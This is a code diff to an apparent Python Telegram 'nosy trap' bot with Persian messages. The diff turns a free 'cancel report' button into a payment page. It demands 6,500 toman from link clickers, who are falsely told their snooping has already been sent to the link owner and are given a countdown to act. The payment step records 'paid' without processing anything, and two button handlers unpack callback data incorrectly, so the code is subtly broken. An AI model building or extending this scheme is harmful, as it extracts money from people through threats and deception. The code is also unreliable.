@@ -27,7 +27,8 @@ c.execute("""CREATE TABLE IF NOT EXISTS pending_reports (
     clicker_id INTEGER,
     message_id INTEGER,
     expires_at DATETIME,
-    cancelled BOOLEAN DEFAULT FALSE
+    cancelled BOOLEAN DEFAULT FALSE,
+    paid BOOLEAN DEFAULT FALSE
 )""")
 conn.commit()
 
@@ -64,6 +65,14 @@ def get_clicker_name(clicker_id):
 
 def delete_message_later(chat_id, message_id, delay, clicker_id, owner_name):
     time.sleep(delay)
+    
+    # چک کن که آیا پرداخت شده یا لغو شده
+    c.execute("SELECT cancelled, paid FROM pending_reports WHERE clicker_id = ? ORDER BY id DESC LIMIT 1", (clicker_id,))
+    result = c.fetchone()
+    
+    if result and (result[0] == True or result[1] == True):
+        return  # اگه لغو شده یا پرداخت شده، پیام نفرست
+    
     try:
         bot.delete_message(chat_id, message_id)
     except:
@@ -77,11 +86,13 @@ def delete_message_later(chat_id, message_id, delay, clicker_id, owner_name):
 
 def send_report_after_delay(link_code, owner_id, clicker_id, delay=75):
     time.sleep(delay)
-    c.execute("SELECT cancelled FROM pending_reports WHERE link_code = ? AND clicker_id = ? AND owner_id = ? ORDER BY id DESC LIMIT 1", 
+    
+    c.execute("SELECT cancelled, paid FROM pending_reports WHERE link_code = ? AND clicker_id = ? AND owner_id = ? ORDER BY id DESC LIMIT 1", 
               (link_code, clicker_id, owner_id))
     result = c.fetchone()
     
-    if not result or result[0] == False:
+    # اگه لغو نشده و پرداخت نشده، گزارش بفرست
+    if result and result[0] == False and result[1] == False:
         clicker_name = get_clicker_name(clicker_id)
         report_msg = f"🎯 **یک فضول در تله افتاد!**\n\n👤 نام: {clicker_name}\n⏰ زمان: {datetime.now().strftime('%H:%M:%S')}"
         try:
@@ -89,7 +100,26 @@ def send_report_after_delay(link_code, owner_id, clicker_id, delay=75):
         except:
             pass
 
-# ---------- هندلر استارت (بدون پیام تست) ----------
+# ---------- صفحه پرداخت ----------
+def show_payment_page(chat_id, link_code, clicker_id, owner_id, message_id):
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton("💳 پرداخت با کارت بانکی", callback_data=f"pay_{link_code}_{clicker_id}"),
+        InlineKeyboardButton("🔙 انصراف", callback_data=f"cancel_pay_{link_code}_{clicker_id}")
+    )
+    
+    payment_text = (
+        f"💰 **درخواست پول**\n\n"
+        f"با پرداخت فقط **6,500 تومان**، گزارش فضولی شما برای صاحب لینک ارسال نخواهد شد.\n\n"
+        f"📊 **جزئیات:**\n"
+        f"• لغو گزارش: 65,000 ریال\n"
+        f"• مبلغ: 65,000 ریال\n\n"
+        f"⬇️ برای پرداخت روی دکمه زیر کلیک کنید."
+    )
+    
+    bot.send_message(chat_id, payment_text, reply_markup=keyboard, parse_mode='Markdown')
+
+# ---------- هندلر استارت ----------
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
@@ -104,17 +134,17 @@ def start(message):
             owner_name = get_owner_name(owner_id)
             
             keyboard = InlineKeyboardMarkup()
-            keyboard.add(InlineKeyboardButton("❌ عدم ارسال گزارش فضولی", callback_data=f"cancel_{code}_{clicker_id}"))
+            keyboard.add(InlineKeyboardButton("❌ عدم ارسال گزارش فضولی 😊", callback_data=f"show_pay_{code}_{clicker_id}_{owner_id}"))
             
             trap_message = (
                 f"⚠️ **نبايد اين فضولی رو ميکردی!** 🥰\n\n"
                 f"الان اين فضوليت برای {owner_name} ارسال شد، "
                 f"بهتره قبل از اينکه بياد ببينه، خودت بهش بگی داشتی فضولی ميکردی 😊\n\n"
-                f"برای عدم ارسال دکمه زير را فشار دهيد (فرصت شما 1 دقيقه و 15 ثانيه)\n\n"
-                f"❌ عدم ارسال گزارش فضولی"
+                f"🕐 **زمان باقی‌مانده: ۱:۱۵**\n\n"
+                f"برای عدم ارسال دکمه زیر را فشار دهید:\n\n"
+                f"❌ عدم ارسال گزارش فضولی 😊"
             )
             
-            # فرستادن مستقیم پیام تله - بدون هیچ پیام اضافی
             msg = bot.send_message(clicker_id, trap_message, reply_markup=keyboard, parse_mode='Markdown')
             
             c.execute("INSERT INTO pending_reports (link_code, owner_id, clicker_id, message_id, expires_at) VALUES (?, ?, ?, ?, ?)",
@@ -129,7 +159,6 @@ def start(message):
         else:
             bot.send_message(clicker_id, "❌ لینک نامعتبر!")
     else:
-        # start ساده - فقط یک پیام خوش‌آمدگویی ساده
         bot.send_message(user_id, "👋 به ربات خوش آمدی.\nبرای دریافت لینک /link رو بفرست.")
 
 # ---------- دریافت لینک ----------
@@ -139,30 +168,83 @@ def get_link(message):
     link = generate_link(user_id)
     bot.send_message(user_id, f"🔗 لینک اختصاصی تو:\n`{link}`\n\nاین لینک رو تو بیوگرافیت بذار.", parse_mode='Markdown')
 
-# ---------- دکمه لغو گزارش ----------
-@bot.callback_query_handler(func=lambda call: call.data.startswith("cancel_"))
-def cancel_report(call):
-    _, code, clicker_id = call.data.split("_")
-    clicker_id = int(clicker_id)
+# ---------- هندلر دکمه‌ها ----------
+@bot.callback_query_handler(func=lambda call: True)
+def handle_buttons(call):
+    data = call.data
+    user_id = call.from_user.id
     
-    if call.from_user.id != clicker_id:
-        bot.answer_callback_query(call.id, "این دکمه مال تو نیست!", show_alert=True)
-        return
+    # نمایش صفحه پرداخت
+    if data.startswith("show_pay_"):
+        _, _, link_code, clicker_id, owner_id = data.split("_")
+        clicker_id = int(clicker_id)
+        owner_id = int(owner_id)
+        
+        if user_id != clicker_id:
+            bot.answer_callback_query(call.id, "این دکمه مال تو نیست!", show_alert=True)
+            return
+        
+        # پیدا کردن message_id برای حذف پیام قبلی
+        c.execute("SELECT message_id FROM pending_reports WHERE link_code = ? AND clicker_id = ? ORDER BY id DESC LIMIT 1", 
+                  (link_code, clicker_id))
+        result = c.fetchone()
+        
+        if result:
+            try:
+                bot.delete_message(call.message.chat.id, result[0])
+            except:
+                pass
+        
+        show_payment_page(call.message.chat.id, link_code, clicker_id, owner_id, result[0] if result else None)
+        bot.answer_callback_query(call.id)
     
-    c.execute("UPDATE pending_reports SET cancelled = TRUE WHERE link_code = ? AND clicker_id = ?", (code, clicker_id))
-    conn.commit()
+    # پرداخت انجام شد
+    elif data.startswith("pay_"):
+        _, _, link_code, clicker_id = data.split("_")
+        clicker_id = int(clicker_id)
+        
+        if user_id != clicker_id:
+            bot.answer_callback_query(call.id, "این دکمه مال تو نیست!", show_alert=True)
+            return
+        
+        # ثبت پرداخت در دیتابیس
+        c.execute("UPDATE pending_reports SET paid = TRUE, cancelled = TRUE WHERE link_code = ? AND clicker_id = ?", 
+                  (link_code, clicker_id))
+        conn.commit()
+        
+        # حذف پیام پرداخت
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
+        
+        # پیام تأیید پرداخت
+        confirm_message = (
+            "✅ **پرداخت با موفقیت انجام شد!**\n\n"
+            "گزارش فضولی شما ارسال نشد.\n"
+            "اين فرصت رو غنيمت بدون و ديگه فضولی نکن 😊"
+        )
+        bot.send_message(call.message.chat.id, confirm_message, parse_mode='Markdown')
+        bot.answer_callback_query(call.id, "پرداخت موفق!")
     
-    try:
-        bot.delete_message(call.message.chat.id, call.message.message_id)
-    except:
-        pass
-    
-    bot.send_message(
-        call.message.chat.id,
-        "✅ **گزارش فضولی ارسال نشد!**\n\nاين فرصت رو غنيمت بدون و ديگه فضولی نکن.",
-        parse_mode='Markdown'
-    )
-    bot.answer_callback_query(call.id, "گزارش کنسل شد!")
+    # انصراف از پرداخت
+    elif data.startswith("cancel_pay_"):
+        _, _, _, link_code, clicker_id = data.split("_")
+        clicker_id = int(clicker_id)
+        
+        if user_id != clicker_id:
+            bot.answer_callback_query(call.id, "این دکمه مال تو نیست!", show_alert=True)
+            return
+        
+        # حذف پیام پرداخت
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
+        
+        # برگردوندن پیام قبلی یا پیام انصراف
+        bot.send_message(call.message.chat.id, "❌ از پرداخت انصراف دادید. گزارش فضولی ارسال خواهد شد.")
+        bot.answer_callback_query(call.id, "انصراف از پرداخت")
 
 # ---------- مسیرهای Flask ----------
 @app.route('/webhook', methods=['POST'])
